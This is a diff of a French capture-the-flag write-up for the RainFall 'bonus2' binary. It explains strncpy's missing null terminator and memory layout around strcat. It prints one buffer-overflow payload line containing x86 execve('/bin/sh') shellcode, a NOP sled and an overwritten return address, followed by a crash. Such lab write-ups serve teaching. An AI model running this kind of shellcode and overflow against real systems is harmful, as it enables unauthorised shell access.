@@ -1,7 +1,3 @@
-https://www.unixawy.com/smash-stack-level6/
-https://www.greyhat.dk/io-smashthestack-level-06/
-https://github.com/randomcompanyname/ctf_writeup/blob/master/io.netgarage.org/level6.md
-
 Observons le comportement du binaire.
 
 bonus2@RainFall:~$ ./bonus2
@@ -30,7 +26,7 @@ puts("Hello a"Hello a
 
 Les strncpy prennent les arguments avec une taille (n) respective de 40 et 32
 
-et un strncpy avec une chaine de longueur = ou > à n ne mettra pas de \0 à la fin de la chaine
+et un strncpy avec une chaine de longueur >= à n ne mettra pas de \0 à la fin de la chaine
 
 Observons la mémoire autour du strcat qui a l'air de combiner la chaine "Hello " à notre premier argument
 
@@ -198,7 +194,7 @@ ensuite on exécute la payload
 bonus2@RainFall:~$ ./bonus2 $(python -c 'print "\x90" * 3 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 37 + " " +  "B" * 23 + "\xa0\xf5\xff\xbf"')
 Goedemiddag! ���1�Ph//shh/bin��PS��
                                     ̀AAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB����
-Segmentation fault (core dumped)
+Illegal instruction (core dumped)
 
 Il ne semble pas qu'on ait une bonne addresse
 
